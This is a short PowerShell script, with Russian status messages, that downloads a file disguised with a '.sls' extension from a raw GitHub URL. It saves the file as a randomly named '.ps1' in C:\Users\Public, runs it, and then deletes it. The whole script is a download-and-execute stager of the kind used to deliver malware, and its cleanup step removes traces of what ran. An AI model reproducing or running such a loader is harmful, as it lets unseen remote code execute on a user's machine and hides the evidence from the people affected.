$url = "raw.githubusercontent.com/robotinsideus12/trust/refs/heads/main/try.sls"


$randomFileName = (Get-Random).ToString() + ".ps1"
$filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName

Write-Host "Временный файл будет создан по пути: $filePath"

try {
    # SAVE
    Invoke-RestMethod -Uri $url | Set-Content -Path $filePath

    # 3. START
    & $filePath
    
    Write-Host "Скрипт успешно выполнен."
}
catch {
    # ERR
    Write-Error "Произошла ошибка: $($_.Exception.Message)"
}
finally {
    # 4. DEL
    if (Test-Path $filePath) {
        Remove-Item $filePath
        Write-Host "tmp '$filePath' del."
    }
}
